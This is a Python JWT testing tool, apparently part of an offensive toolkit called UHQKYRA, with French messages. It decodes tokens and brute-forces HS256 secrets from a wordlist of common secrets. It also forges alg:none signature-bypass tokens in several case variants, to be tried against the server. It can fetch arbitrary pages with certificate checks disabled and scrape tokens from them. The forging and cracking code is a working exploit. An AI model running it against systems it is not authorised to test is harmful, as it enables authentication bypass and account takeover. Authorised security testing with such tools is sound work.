"""
JWT Analyzer - UHQKYRA v3.0
Decode, analyze, and test JWT token vulnerabilities:
- Algorithm confusion (RS256 -> HS256)
- None algorithm bypass
- Weak secret brute-force
- Expired token detection
- Sensitive data in payload
"""
import base64
import json
import hmac
import hashlib
import re
import time

COMMON_JWT_SECRETS = [
    "secret","password","123456","qwerty","admin","test","key","jwt",
    "your-secret-key","your-256-bit-secret","supersecret","mysecret",
    "change_me","changeme","secretkey","jwttoken","token","auth",
    "letmein","welcome","monkey","dragon","master","pass","pass123",
    "abc123","password1","iloveyou","princess","sunshine","000000",
    "1234","12345","123456789","1234567890","qwertyuiop","987654321",
    "football","baseball","superman","batman","hello","world",
    "openssl_default","laravel_key","django_secret","rails_secret",
    "node_secret","express_secret","app_secret","flask_secret",
]


def _b64url_decode(s):
    s = s.replace('-', '+').replace('_', '/')
    pad = 4 - len(s) % 4
    if pad != 4:
        s += '=' * pad
    try:
        return base64.b64decode(s)
    except Exception:
        return b""


def _b64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()


def decode_jwt(token):
    """Decode JWT without verification"""
    parts = token.strip().split('.')
    if len(parts) != 3:
        return None, None, None
    try:
        header = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
        signature = parts[2]
        return header, payload, signature
    except Exception:
        return None, None, None


def analyze_jwt(token, callback=None):
    """Full JWT analysis"""
    def cb(t, m):
        if callback: callback({"type": t, "message": m})

    results = {
        "valid_format": False,
        "header": None, "payload": None,
        "algorithm": None, "vulnerabilities": [],
        "sensitive_data": [],
        "expired": False, "expiry": None,
        "cracked_secret": None,
    }

    cb("info", "Analyse JWT...")
    header, payload, sig = decode_jwt(token)
    if not header:
        cb("error", "Format JWT invalide")
        return results

    results["valid_format"] = True
    results["header"] = header
    results["payload"] = payload
    results["algorithm"] = header.get("alg", "?")
    cb("found", f"Algorithme: {header.get('alg','?')}")
    cb("found", f"Payload: {json.dumps(payload)[:200]}")

    # Check algorithm
    alg = header.get("alg", "").upper()
    if alg == "NONE" or alg == "":
        results["vulnerabilities"].append({
            "type": "alg_none", "severity": "critical",
            "name": "Algorithme 'none' -- pas de verification de signature !",
            "detail": "Le token peut etre forge sans connaitre le secret"
        })
        cb("vuln", "CRITICAL: alg:none -- signature non verifiee !")
    elif alg == "HS256" and header.get("typ", "").upper() == "JWT":
        cb("info", "Test brute-force secret HS256...")
        cracked = _bruteforce_hs256(token, cb)
        if cracked:
            results["cracked_secret"] = cracked
            results["vulnerabilities"].append({
                "type": "weak_secret", "severity": "critical",
                "name": f"Secret JWT faible craque: '{cracked}'",
                "detail": "Forge de tokens JWT possible"
            })
    elif alg in ("RS256", "ES256"):
        cb("warn", "RS256/ES256 -- test confusion algo non implemente (necessite cle publique)")

    # Check expiry
    exp = payload.get("exp")
    if exp:
        import datetime
        exp_dt = datetime.datetime.fromtimestamp(exp)
        results["expiry"] = str(exp_dt)
        if exp < time.time():
            results["expired"] = True
            results["vulnerabilities"].append({
                "type": "expired_token", "severity": "medium",
                "name": f"Token JWT expire ({exp_dt.strftime('%Y-%m-%d %H:%M')})",
                "detail": "Si le serveur l'accepte toujours: vulnerabilite !"
            })
            cb("warn", f"Token expire: {exp_dt}")
    else:
        results["vulnerabilities"].append({
            "type": "no_expiry", "severity": "medium",
            "name": "JWT sans expiration (pas de champ 'exp')",
            "detail": "Token valide indefiniment"
        })
        cb("warn", "Pas d'expiration dans le JWT")

    # Sensitive data in payload
    sensitive_keys = ["password", "passwd", "pwd", "secret", "key", "token",
                      "credit", "card", "ssn", "dob", "phone", "address",
                      "salary", "balance"]
    for k, v in payload.items():
        if any(s in k.lower() for s in sensitive_keys):
            results["sensitive_data"].append({"key": k, "value": str(v)[:50]})
            results["vulnerabilities"].append({
                "type": "sensitive_payload", "severity": "high",
                "name": f"Donnee sensible dans JWT: '{k}'",
                "detail": f"Valeur: {str(v)[:30]}"
            })
            cb("warn", f"Donnee sensible dans JWT: {k}={str(v)[:30]}")

    # Test none bypass
    _test_none_bypass(token, results, cb)

    return results


def _test_none_bypass(token, results, cb):
    """Generate alg:none bypass token"""
    parts = token.strip().split('.')
    if len(parts) != 3:
        return

    try:
        header = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))

        for none_variant in ["none", "None", "NONE", "nOnE"]:
            header_mod = {**header, "alg": none_variant}
            new_header = _b64url_encode(json.dumps(header_mod, separators=(',', ':')).encode())
            forged = f"{new_header}.{parts[1]}."
            results["vulnerabilities"].append({
                "type": "none_bypass_payload",
                "severity": "info",
                "name": f"Token forge (alg:{none_variant}) a tester sur le serveur",
                "detail": forged[:200]
            })

        cb("info", "Tokens alg:none generes -- teste-les sur le serveur !")
    except Exception:
        pass


def _bruteforce_hs256(token, cb):
    parts = token.strip().split('.')
    signing_input = f"{parts[0]}.{parts[1]}".encode()
    expected_sig = _b64url_decode(parts[2])

    for secret in COMMON_JWT_SECRETS:
        sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
        if sig == expected_sig:
            cb("vuln", f"Secret JWT trouve: '{secret}'")
            return secret
    return None


def find_jwt_in_response(text):
    """Find JWT tokens in HTTP response"""
    pattern = r'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}'
    return re.findall(pattern, text)


try:
    import requests
    requests.packages.urllib3.disable_warnings()
    _HAS_REQUESTS = True
except ImportError:
    _HAS_REQUESTS = False


def find_jwts_on_page(url, callback=None):
    """Fetch page and extract + analyze any JWT tokens found"""
    def cb(t, m):
        if callback:
            callback({"type": t, "message": m})

    result = {"tokens_found": [], "analyses": []}

    if not _HAS_REQUESTS:
        return result

    try:
        r = requests.get(url, timeout=10, verify=False,
                         headers={"User-Agent": "Mozilla/5.0"})
        tokens = find_jwt_in_response(r.text)
        # Also check response headers
        for h_val in r.headers.values():
            tokens += find_jwt_in_response(str(h_val))
        tokens = list(set(tokens))
        result["tokens_found"] = tokens

        for tok in tokens[:5]:
            cb("found", f"JWT token trouve: {tok[:40]}...")
            analysis = analyze_jwt(tok, callback=callback)
            result["analyses"].append(analysis)
    except Exception as e:
        cb("warn", f"JWT page scan: {e}")

    return result
